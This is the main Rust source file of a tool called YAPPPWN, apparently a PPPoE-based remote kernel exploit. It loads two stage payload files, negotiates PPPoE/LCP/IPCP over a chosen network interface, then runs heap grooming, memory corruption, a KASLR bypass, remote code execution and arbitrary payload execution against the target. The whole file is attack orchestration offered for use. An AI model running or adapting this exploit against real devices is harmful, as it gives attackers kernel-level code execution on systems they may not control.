mod constants;
mod exploit;
mod parser;

use exploit::Exploit;
use parser::{get_args, Args};
use pnet::datalink::{self};

use std::fs::File;
use std::io::{self, Read};

fn read_stage(file_path: &str) -> io::Result<Vec<u8>> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    Ok(buffer) // Return the buffer
}

fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String) {
    // Find interface
    let interface = datalink::interfaces()
        .into_iter()
        .find(|iface| iface.name == interface_name)
        .expect("Failed to find the network interface");

    // Exploit
    let mut expl = Exploit {
        source_mac: [0; 6], // Using array initialization
        target_mac: [0; 6],
        pppoe_softc: 0,
        host_uniq: [0; 8],
        target_ipv6: [0; 16],
        source_ipv6: [0; 16],
        kaslr_offset: 0,
        stage1: vec![0],
        stage2: vec![0],
    };

    // Load binaries of the two pyaloads
    expl.stage1 = read_stage(&stage1_path).expect("Failed to read Stage 1 file");
    expl.stage2 = read_stage(&stage2_path).expect("Failed to read Stage 2 file");

    // LCP Echo handler
    let mut handler = exploit::LcpEchoHandler::new(&interface);
    handler.start();

    // Stages of the exploit
    println!("[+] Starting Negotiations ...");
    expl.capture_first_padi(&interface);
    let fake_ifnet = expl.build_fake_ifnet();
    expl.ppp_negotiation(&interface, Some(fake_ifnet));
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);
    println!("[+] Initial Negotiations Done...");
    println!("[+] Wait for interface to be ready");
    println!("[+] Starting Heap Grooming...");
    expl.heap_grooming(&interface);
    println!("[+] STAGE 1: Memory corruption");
    expl.memory_corruption(&interface);
    println!("[+] STAGE 2: KASLR defeat");
    expl.defeat_kaslr(&interface);
    println!("[+] STAGE 3: Remote code execution");
    expl.remote_code_exec(&interface);
    expl.source_mac = constants::SOURCE_MAC;
    expl.ppp_negotiation(&interface, None);
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);
    println!("[+] STAGE 4: Arbitrary payload execution");
    expl.frag_and_send(&interface);
    println!("[+] DONE!");

    // Stop the LCP handler
    handler.stop();
}

fn main() {
    println!();
    println!("[+] YAPPPWN [+]");
    let args: Args = get_args();
    println!("{}", args);
    run_exploit(args.interface, args.stage_1, args.stage_2)
}
